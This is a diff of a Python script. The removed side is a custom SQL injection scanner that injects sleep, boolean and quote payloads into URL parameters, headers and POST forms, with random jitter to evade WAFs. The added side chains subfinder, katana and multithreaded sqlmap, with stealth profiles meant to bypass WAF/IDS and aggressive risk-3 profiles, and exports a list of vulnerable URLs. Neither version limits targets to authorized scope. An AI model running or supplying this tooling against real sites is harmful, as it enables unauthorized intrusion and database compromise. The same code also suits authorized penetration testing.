@@ -1,490 +1,278 @@
-import requests
-import time
-import random
 import re
-import difflib
+import shutil
+import subprocess
+import threading
+import time
+import csv
 import os
-from bs4 import BeautifulSoup
-from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
-import xml.etree.ElementTree as ET
 from concurrent.futures import ThreadPoolExecutor
-from threading import Lock
+from urllib.parse import urlparse
 
-# A Lock prevents threads from printing over each other
-print_lock = Lock()
 
-# Class to store sqli injection logic
-class SQLIDetection:
-    # initalises the variable
-    def __init__(self, target_url, payloads, errors):
-        self.target_url = target_url # Stores the target url
-        self.payloads = payloads # Stores the payloads
-        self.errors_signatures = errors # Stores the errors
-        self.session = requests.Session() # Creates a new user session
-        self.noise_threshold = 0.0 # Stores the noise threshold
-        self.baseline_content = self.establish_stable_baseline() # Set a stable baseline to compare against
-
-    # Jitters the program to prevent detection from a WAF
-    def jitter(self):
-        # Sleeps for a random time
-        time.sleep(random.uniform(0.5, 2.0))
-
-    # Establishes a stable baseline to handle noisy pages
-    def establish_stable_baseline(self):
-        # Outputs establishing a baseline
-        print("[*] Establishing stable baseline and noise threshold...")
-        samples = []
-        # Loops three times to get samples
-        for i in range(3):
-            try:
-                res = self.session.get(self.target_url, headers=get_random_agent(), timeout=10)
-                samples.append(res.text)
-            except:
-                samples.append("")
-            if i < 2: time.sleep(1)
+class SQLMapScanner:
+    def __init__(self, target_url, threads=5, profile="normal"):
+        # Basic configuration and target parsing
+        self.target_url = target_url
+        self.domain = urlparse(target_url).netloc
+        self.threads = threads
+        self.profile = profile
         
-        # Calculates the similarity between the samples to find noise
-        if len(samples) >= 2:
-            ratio1 = self.get_similarity(samples[0], samples[1])
-            ratio2 = self.get_similarity(samples[1], (samples[2] if len(samples) > 2 else samples[1]))
-            
-            # Calculates the noise threshold
-            avg_similarity = (ratio1 + ratio2) / 2
-            self.noise_threshold = 1.0 - avg_similarity
+        # Tracking and storage
+        self.results = []        # Stores full dictionaries for CSV export
+        self.vulnerable = []     # Stores only vulnerable URLs for TXT export
         
-        # Outputs the noise level found
-        print(f"[+] Natural page noise detected: {self.noise_threshold:.4f}")
-        return samples[0] if samples else ""
+        # Threading safety locks
+        self.print_lock = threading.Lock()    # Prevents garbled console output
+        self.results_lock = threading.Lock()  # Prevents data loss during list appends
 
-    # Injects payloads into specific URL parameters
-    def get_injected_urls(self, payload):
-        # Parses the URL components
-        parsed_url = urlparse(self.target_url)
-        # Gets the parameters
-        params = parse_qs(parsed_url.query)
-        injected_urls = []
+    # ---------------------------
+    # CRAWLER
+    # ---------------------------
 
-        # Loops over each parameter to inject separately
-        for target_param in params:
-            new_params = {key: val[:] for key, val in params.items()}
-            original_val = new_params[target_param][0]
-            # Adds the payload to the parameter value
-            new_params[target_param] = [f"{original_val}{payload}"]
-            
-            # Rebuilds the URL with the injected parameter
-            new_query = urlencode(new_params, doseq=True)
-            new_url = urlunparse(parsed_url._replace(query=new_query))
-            injected_urls.append(new_url)
-            
-        return injected_urls
+    def run_katana(self, target):
+        """Crawl for hidden endpoints using Project Discovery's Katana"""
 
-    # Checks for a WAF before scanning
-    def check_waf(self):
-        # Dictionary of WAF signatures
-        waf_signatures = {
-            "Cloudflare": "cf-ray",
-            "Akamai": "akamai-ch",
-            "ModSecurity": "mod_security",
-            "Barracuda": "barra_counter_session"
-        }
-        # Outputs checking for WAF
-        print("[*] Checking for WAF/IPS...")
-        try:
-            res = self.session.get(self.target_url, headers=get_random_agent(), timeout=10)
-            # Loops through signatures to find a match
-            for name, signature in waf_signatures.items():
-                if signature in str(res.headers).lower() or signature in res.text.lower():
-                    print(f"[!] Warning: {name} WAF detected. Proceed with caution.")
-                    return True
-        except: pass
-        return False
-
-    # Compares the similarity
-    def get_similarity(self, text1, text2):
-        # Returns a float between 0.0 and 1.0 representing similarity.
-        return difflib.SequenceMatcher(None, text1, text2).ratio()
-
-    # Function to check error based injection
-    def check_error_based(self):
-        # Outputs there is a check for the error based sql injection
-        print("[*] Testing for Error-based SQLi (All Parameters)...")
-
-        # Loops over the payloads
-        for payload in self.payloads["error"]:
-            # Gets injected urls for each parameter
-            urls = self.get_injected_urls(payload)
-            for url in urls:
-                try:
-                    self.jitter()
-                    # Gets the response from the page with the payload
-                    response = self.session.get(url, headers=get_random_agent(), timeout=10)
-                    # Loops over the signatures in the errors list
-                    for signature in self.errors_signatures:
-                        # Checks if the signature is in the response text
-                        if re.search(signature, response.text, re.IGNORECASE):
-                            return f"[!] VULNERABLE: Error-based found on {url} (Matched: {signature})"
-                except: continue
-        return None
-    
-    # Checks for boolean based injection
-    def check_boolean_based(self):
-        # Outputs testing for boolean based sqli
-        print("[*] Testing for Boolean-based SQLi (All Parameters)...")
-        # Loops over the payloads in the boolean payloads
-        for payload_set in self.payloads["boolean"]:
-            # Gets urls for both true and false payloads
-            urls_true = self.get_injected_urls(payload_set["true"])
-            urls_false = self.get_injected_urls(payload_set["false"])
-
-            for i in range(len(urls_true)):
-                try:
-                    self.jitter()
-                    # Stores the true and false response
-                    res_true = self.session.get(urls_true[i], headers=get_random_agent())
-                    res_false = self.session.get(urls_false[i], headers=get_random_agent())
-                    
-                    # Fuzzy Logic adjusted by noise threshold
-                    diff_sim = self.get_similarity(res_true.text, res_false.text)
-
-                    # Checks if similarity drop is greater than noise plus margin
-                    if diff_sim < (1.0 - self.noise_threshold - 0.05):
-                        # Returns vulnerable payload found
-                        return f"[!] VULNERABLE: Boolean-based found on {urls_true[i]} (Similarity: {diff_sim:.2f})"           
-                except: continue 
-        return None
-
-    # Checks for time based sql injection
-    def check_time_based(self):
-        # Outputs checks for time based sqli
-        print("[*] Testing for Time-based SQLi (All Parameters)...")
-        
-        # Loops over the payloads in the time payloads
-        for payload in self.payloads["time"]:
-            # Gets the injected urls
-            urls = self.get_injected_urls(payload)
-            # Loops over the urls
-            for url in urls:
-                try:
-                    # Records the starting time
-                    start = time.time()
-                    # Sends the request
-                    self.session.get(url, headers=get_random_agent(), timeout=15)
-                    # Calculates the duration
-                    duration = time.time() - start
-                    # Checks the duaration is more than five secomds
-                    if duration >= 5:
-                        # Returns which payload triggered
-                        return f"[!] VULNERABLE: Time-based found on {url}"
-                except requests.exceptions.Timeout:
-                    return f"[!] VULNERABLE: Time-based (Timeout triggered) on {url}"
-                except: continue
-        return None
-
-    # Checks for SQLi in the HTTP headers
-    def check_header_injection(self):
-        # Outputs testing for header injection
-        print("[*] Testing for Header-based SQLi (Referer)...")
-        payload = "'"
-        headers = get_random_agent()
-        # Injects payload into the Referer header
-        headers["Referer"] = f"http://google.com/{payload}"
-        try:
-            res = self.session.get(self.target_url, headers=headers)
-            # Checks for errors in the response
-            for sig in self.errors_signatures:
-                # Searches for the regular expression
-                if re.search(sig, res.text, re.IGNORECASE):
-                    # Returns vulnerable
-                    return f"[!] VULNERABLE: Header-based SQLi found in Referer!"
-        except: pass
-        return None
-
-    # Finds all forms on the page and tests the input fields
-    def check_post_forms(self):
-        # Outputs that we are starting form scanning
-        print("[*] Searching for HTML forms to test POST-based SQLi...")
-        
-        # Uses BeautifulSoup to find all form tags
-        soup = BeautifulSoup(self.baseline_content, "html.parser")
-        forms = soup.find_all("form")
-        
-        # Loops through every form found on the page
-        for form in forms:
-            action = form.attrs.get("action")
-            # Joins the relative action (e.g., /login.jsp) with the base URL
-            post_url = urljoin(self.target_url, action)
-            method = form.attrs.get("method", "get").lower()
-            
-            # We only care about POST forms for this specific check
-            if method == "post":
-                # Gets all input fields in the form
-                inputs = []
-                # Loops over the input tag
-                for input_tag in form.find_all("input"):
-                    # Gets the name from the input tage
-                    name = input_tag.attrs.get("name")
-                    # Gets the tage type and text
-                    type = input_tag.attrs.get("type", "text")
-                    # Checks if there is name
-                    if name:
-                        # Adds it to inputs
-                        inputs.append({"name": name, "type": type})
-
-                # Loops through our error payloads to test the form fields
-                for payload in self.payloads["error"]:
-                    # Stores the data
-                    data = {}
-                    # Loops over the input in inputs
-                    for iput in inputs:
-                        # Checks for if the type is submit
-                        if iput["type"] != "submit":
-                            data[iput["name"]] = payload # Fills every box with the payload
-                    
-                    try:
-                        self.jitter()
-                        # Sends the POST request to the form's action URL
-                        res = self.session.post(post_url, data=data, headers=get_random_agent())
-                        
-                        # Checks the response for DB errors
-                        for sig in self.errors_signatures:
-                            # Searches for the error
-                            if re.search(sig, res.text, re.IGNORECASE):
-                                return f"[!] VULNERABLE: POST-based SQLi found at {post_url} in form field!"
-                    except: continue
-        return None
-    
-    # Function to run a program
-    def run(self):
-        # Runs the WAF check first
-        self.check_waf()
-        
-        # Stores the results from each of the methods
-        results = [
-            self.check_error_based(),
-            self.check_boolean_based(),
-            self.check_time_based(),
-            self.check_header_injection(),
-            self.check_post_forms()
-        ]
-        
-        # Creates a list of the found results
-        found = [result for result in results if result is not None]
-        # Checks if there is anything found
-        if found:
-            # Loops over entries and prints them
-            for f in found: print(f)
-            print(f"\n[+] Recommendation: Proceed with: sqlmap -u \"{self.target_url}\" --batch --random-agent")
-            # Returns the list of findings
-            return found
-        else:
-            # Prints no obivous vulnerabilites found
-            print("[-] No obvious vulnerabilities detected.")
-            # Returns empty list
+        # Verifies if the tool exists in the system path
+        if not shutil.which("katana"):
+            print("[!] Katana not found. Skipping crawl.")
             return []
 
-# Function to get random user agent from folder
-def get_random_agent():
-    # Fallback agents if file is missing
-    user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"]
-    # Path to the user agent file
-    ua_path = "../../Resources/user_agent_strings.txt"
-    
-    if os.path.exists(ua_path):
-        # Opens the file
-        with open(ua_path, "r") as f:
-            # Extracts the user agents as a list
-            user_agents = [ua.strip() for ua in f if ua.strip()]
+        discovered = []
+        print(f"[*] Starting Katana deep crawl on {target}...")
 
-    # Returns the headers with a random agent
-    return {"User-Agent": random.choice(user_agents)}
+        # Ensures the URL has a protocol prefix
+        formatted_target = target if "://" in target else f"http://{target}"
 
-def get_errors_messages():
-    # Stores the error to be returned
-    error_list = []
-    # SQL Errors file from sqlmap
-    error_file = "https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/data/xml/errors.xml"
-    try:
-        # Gets the errors from the error file
-        errors = requests.get(error_file, timeout=10)
-        # Creates the element tree object
-        root = ET.fromstring(errors.content)
-        # Loops over the tree root for dbms items
-        for item in root.findall("dbms"):
-            for child in item:
-                # Adds the error pattern to the array
-                error_list.append(child.get('regexp'))
-    except:
-        # Fallback if the remote file cannot be reached
-        return ["sql syntax", "mysql_fetch", "ora-00933", "sqlite3.operationalerror"]
+        try:
+            # Runs katana with JS crawling and no-colors enabled
+            cmd = ["katana", "-u", formatted_target, "-depth", "3", "-silent", "-nc", "-jc"]
+            result = subprocess.run(cmd, capture_output=True, text=True)
 
-    # Returns an error list
-    return error_list
-
-# Function to crawl a website
-def crawl_website(url, domain, visited=None):
-    # Checks if visited is none
-    if visited is None:
-        # Creates a new set for visited
-        visited = set()
-
-    # Makes it stay within the same domain and avoid re-visiting pages
-    if url in visited or domain not in url:
-        # Returns visited
-        return visited
-
-    # Outputs thw url which is being visited
-    print(f"Visiting: {url}")
-    # Adds the url to the set
-    visited.add(url)
-
-    try:
-        # Gets a response from the page
-        response = requests.get(url, headers=get_random_agent(), timeout=5)
-        # Only parse HTML content
-        if "text/html" not in response.headers.get("Content-Type", ""):
-            # Returns the visited page
-            return visited
+            # Cleans the output lines and filters empty strings
+            discovered.extend([line.strip() for line in result.stdout.splitlines() if line.strip()])
+        except Exception as e:
+            print(f"[!] Katana Error: {e}")
         
-        # Creates new beautiful soup object to parse the page
-        soup = BeautifulSoup(response.text, 'html.parser')
+        # Filters duplicates before returning
+        return list(set(discovered))
 
-        # Finds all 'a' tags with an 'href' attribute
-        for link in soup.find_all('a', href=True):
-            # Gets the link urls
-            link_url = link['href']
+    def run_subfinder(self):
+        """Discover subdomains to broaden the attack surface"""
+
+        # Verifies tool installation
+        if not shutil.which("subfinder"):
+            print("[!] Subfinder not found. Using root domain only.")
+            return [self.domain]
+
+        print(f"[*] Discovering subdomains for {self.domain}...")
+
+        try:
+            # Executes silent subdomain enumeration
+            result = subprocess.run(["subfinder", "-d", self.domain, "-silent"], capture_output=True, text=True)
+            found = [line.strip() for line in result.stdout.splitlines() if line.strip()]
             
-            # Resolve relative URLs (e.g., /about -> https://site.com/about)
-            full_url = urljoin(url, link_url)
-            
-            # Clean fragments (e.g., site.com/#section -> site.com/)
-            full_url = full_url.split('#')[0]
+            # Returns discovered subdomains or the root domain as a fallback
+            return found if found else [self.domain]
+        except Exception:
+            return [self.domain]
 
-            # 3. Recursive call to traverse the next page
-            crawl_website(full_url, domain, visited)
-
-    # Catches the error
-    except Exception as e:
-        # Outputs an error message
-        print(f"Could not crawl {url}: {e}")
-
-    # Returns visited
-    return visited
-
-# Function to be executed by the threads.
-def scan_page(page, payloads, errors):
-    # Locks the print function to prevent jumbled text
-    with print_lock:
-        # Outputs the page being scanned
-        print(f"\n--- Scanning: {page} ---")
+    # ---------------------------
+    # SQLMAP COMMAND BUILDER
+    # ---------------------------
     
-    # Runs the scan
-    scanner = SQLIDetection(page, payloads, errors)
-    # Returns the list of vulnerabilities found for this page
-    return scanner.run()
+    def build_sqlmap_cmd(self, url):
+        """Constructs the sqlmap command based on the selected profile"""
+
+        # Default parameters used across all scans
+        base_cmd = [
+            "sqlmap",
+            "-u", url,
+            "--batch",           # Never ask for user input
+            "--random-agent",    # Use random browser headers
+            "--output-dir=sqlmap_results"
+        ]
+
+        # Applies profile-specific aggression settings
+        if self.profile == "stealth":
+            # Low level/risk and high delay to bypass WAF/IDS
+            base_cmd += ["--level=1", "--risk=1", "--threads=1", "--delay=2"]
+        elif self.profile == "aggressive":
+            # Maximum depth and multiple techniques enabled
+            base_cmd += ["--level=5", "--risk=3", "--threads=10", "--technique=BEUST", "--crawl=2", "--forms"]
+        else:  
+            # Balanced settings for standard testing
+            base_cmd += ["--level=3", "--risk=2", "--threads=5", "--technique=BEUST"]
+
+        return base_cmd
+
+    # ---------------------------
+    # RUN SQLMAP
+    # ---------------------------
+
+    def run_sqlmap(self, url):
+        """Executes sqlmap and parses the raw output for data extraction"""
+
+        cmd = self.build_sqlmap_cmd(url)
+
+        # Standardizes console logging across threads
+        with self.print_lock:
+            print(f"[>] Testing: {url}")
+
+        try:
+            # Runs the tool and captures the full stdout
+            result = subprocess.run(cmd, capture_output=True, text=True)
+            output = result.stdout
+
+            # Logic to determine if the target is actually exploitable
+            is_vulnerable = any(phrase in output.lower() for phrase in ["is vulnerable", "confirming microsoft sql server"])
+
+            # Uses regex to pull the specific DB type (e.g. MySQL)
+            dbms = self._extract_value(r"back-end DBMS: (.*?)(?:\s|\n|$)", output)
+            
+            # Uses regex to find the exploitation types (e.g. error-based, time-based)
+            techniques = re.findall(r"Type: (.*?)[\s\n]", output)
+
+            # Formats the data into a structured record for analysis
+            record = {
+                "url": url,
+                "vulnerable": is_vulnerable,
+                "technique": ",".join(set(techniques)) if techniques else "N/A",
+                "dbms": dbms if dbms else "Unknown",
+                "profile": self.profile,
+                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
+            }
+
+            # Safely updates shared lists using a lock
+            with self.results_lock:
+                self.results.append(record)
+                if is_vulnerable:
+                    # Adds to the specific list for TXT export
+                    self.vulnerable.append(url)
+
+            # Instant feedback if a hit is confirmed
+            if is_vulnerable:
+                with self.print_lock:
+                    print(f"[!] SQLi Found: {url} | DBMS: {dbms}")
+
+        except Exception as e:
+            with self.print_lock:
+                print(f"[ERROR] {url} → {e}")
+
+    def _extract_value(self, pattern, text, flags=re.IGNORECASE):
+        """Helper to safely extract regex groups without crashing"""
+        match = re.search(pattern, text, flags)
+        return match.group(1).strip() if match else None
+
+    # ---------------------------
+    # SCAN ALL TARGETS
+    # ---------------------------
+
+    def scan(self):
+        """Main scanning orchestration logic"""
+
+        # Create output directory if it doesn't exist
+        if not os.path.exists("sqlmap_results"):
+            os.makedirs("sqlmap_results")
+
+        # Step 1: Find subdomains
+        subdomains = self.run_subfinder()
+
+        # Step 2: Crawl each subdomain for entry points
+        for subdomain in subdomains:
+            targets = self.run_katana(subdomain)
+
+            if not targets:
+                print(f"[-] No parameters found on {subdomain}")
+                continue
+
+            print(f"[*] Testing {len(targets)} injection points on {subdomain}...\n")
+
+            # Step 3: Run multithreaded sqlmap instances
+            with ThreadPoolExecutor(max_workers=self.threads) as executor:
+                executor.map(self.run_sqlmap, targets)
+
+    # ---------------------------
+    # SAVE RESULTS
+    # ---------------------------
+
+    def save_results(self):
+        """Exports data to CSV for analysis and TXT for vulnerable targets"""
+        
+        if not self.results:
+            print("\n[-] No data collected.")
+            return
+
+        timestamp = int(time.time())
+        csv_filename = f"sqlmap_analysis_{timestamp}.csv"
+        txt_filename = f"vulnerable_urls_{timestamp}.txt"
+
+        # Export ALL records (vulnerable and non-vulnerable) to CSV
+        try:
+            with open(csv_filename, "w", newline="", encoding="utf-8") as f:
+                writer = csv.DictWriter(f, fieldnames=self.results[0].keys())
+                writer.writeheader()
+                writer.writerows(self.results)
+            print(f"\n[+] Comprehensive analysis saved to: {csv_filename}")
+        except Exception as e:
+            print(f"[ERROR] CSV Save Failed: {e}")
+
+        # Export ONLY vulnerable URLs to a simple text file
+        if self.vulnerable:
+            with open(txt_filename, "w") as f:
+                # Use set() to ensure we don't save the same URL twice
+                for url in sorted(set(self.vulnerable)):
+                    f.write(url + "\n")
+            print(f"[+] Clean vulnerable list saved to: {txt_filename}")
+        else:
+            print("[-] No vulnerable URLs to save to TXT.")
+
+    # ---------------------------
+    # RUN EVERYTHING
+    # ---------------------------
+
+    def run(self):
+        """High-level execution flow"""
+        start_time = time.time()
+
+        self.scan()
+        self.save_results()
+
+        duration = time.time() - start_time
+        print(f"\n[✓] Total Execution Time: {duration:.2f}s")
+
+
+# ---------------------------
+# MAIN FUNCTION
+# ---------------------------
 
 def main():
-    # Logs the starting time
-    start_time = time.perf_counter() 
-
-    # Payloads for initial detection
-    payloads = {
-        "error": ["'", "''", "\"", "`", "')"],
-        "boolean": [
-            {"true": " AND 1=1", "false": " AND 1=2"},
-            {"true": "' OR '1'='1", "false": "' OR '1'='2"}
-        ],
-        "time": ["' OR SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "') OR pg_sleep(5)--"]
-    }
-
-    # Gets the error messages
-    errors = get_errors_messages()
-
-    # Allows the user to enter in a url to scan
-    url = input("Enter URL: ").strip()
-    target_domain = urlparse(url).netloc
+    """Handles the user interface and initial setup"""
     
-    # Outputs the pages are being crawled
-    print("[*] Starting crawl to map the attack surface...")
-    # Stores all of the pages
-    all_pages = crawl_website(url, target_domain)
-    
-    # Then, scan every page discovered
-    print(f"[*] Discovery complete. Scanning {len(all_pages)} pages for SQLi...")
+    print("=" * 40)
+    print("  SQLMAP AUTOMATED SCANNER & ANALYSER  ")
+    print("=" * 40)
 
-    # Stores all vulnerabilities found across all threads
-    vulnerability_log = []
+    # User Input Handling
+    target = input("Enter Target Domain (e.g., target.com): ").strip()
+    if not target:
+        print("[!] Target required.")
+        return
 
-    # Creates the thread pool executor
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        # Maps the scan_page function to the all_pages list and gets futures
-        futures = [executor.submit(scan_page, page, payloads, errors) for page in all_pages]
-        
-        # Collects results from the futures as they finish
-        for future in futures:
-            # Gets the list of findings from the thread
-            result = future.result()
-            # Checks if findings exist
-            if result:
-                # Extends the log with the findings
-                vulnerability_log.extend(result)
+    print("\n[Profiles] stealth, normal, aggressive")
+    prof = input("Select Profile [normal]: ").strip().lower()
+    if prof not in ["stealth", "normal", "aggressive"]:
+        prof = "normal"
 
-    # Gets end time and calculates the elasped time
-    end_time = time.perf_counter()
-    elapsed = end_time - start_time
+    try:
+        thread_count = input("Thread Count [5]: ").strip()
+        threads = int(thread_count) if thread_count else 5
+    except ValueError:
+        threads = 5
 
-    # Outputs the time
-    print(f"\n[✓] Finished in {elapsed:.2f} seconds")
+    # Start the engine
+    scanner = SQLMapScanner(target, threads=threads, profile=prof)
+    scanner.run()
 
-    # Checks if any vulnerabilities were found
-    if vulnerability_log:
-        # Prompts the user to save to a file
-        choice = input(f"\n[!] Found {len(vulnerability_log)} vulnerabilities. Save to file? (y/n): ").strip().lower()
-        # Checks if user wants to save
-        if choice == 'y':
-            # Opens the file to write
-            with open("sqli_detection_results.txt", "w") as f:
-                # Use a set to store unique clean URLs (with parameters)
-                unique_urls = set()
-                # Loops over the log
-                for vuln in vulnerability_log:
-                    # Uses regex to extract only the URL from the result string
-                    url_match = re.search(r'https?://[^\s]+', vuln)
-                    # Checks if a match was found
-                    if url_match:
-                        # Extracts the clean URL
-                        dirty_url = url_match.group().rstrip(')')
-                        
-                        # PARSE and RECONSTRUCT the URL to remove the payload only
-                        # This ensures sqlmap gets the parameter names (like ?id=) but not the bad characters
-                        parsed = urlparse(dirty_url)
-                        params = parse_qs(parsed.query)
-                        
-                        clean_params = {}
-                        for key, values in params.items():
-                            val = values[0]
-                            # Clean each parameter of our known payloads
-                            for p_type, p_list in payloads.items():
-                                for p in p_list:
-                                    if isinstance(p, dict):
-                                        val = val.replace(p["true"], "").replace(p["false"], "")
-                                    else:
-                                        val = val.replace(p, "")
-                            clean_params[key] = val
-                        
-                        # Rebuild the query string with original parameter names
-                        new_query = urlencode(clean_params, doseq=True)
-                        final_url = urlunparse(parsed._replace(query=new_query))
-                        unique_urls.add(final_url)
 
-                # Write unique clean URLs to the file
-                for url in sorted(unique_urls):
-                    f.write(f"{url}\n")
-            # Outputs confirmation
-            print(f"[+] {len(unique_urls)} URLs (parameters preserved) saved to sqli_detection_results.txt")
-    else:
-        # Outputs that nothing was found to save
-        print("[-] No vulnerabilities found to save.")
-
-# Starts the program
 if __name__ == "__main__":
     main()
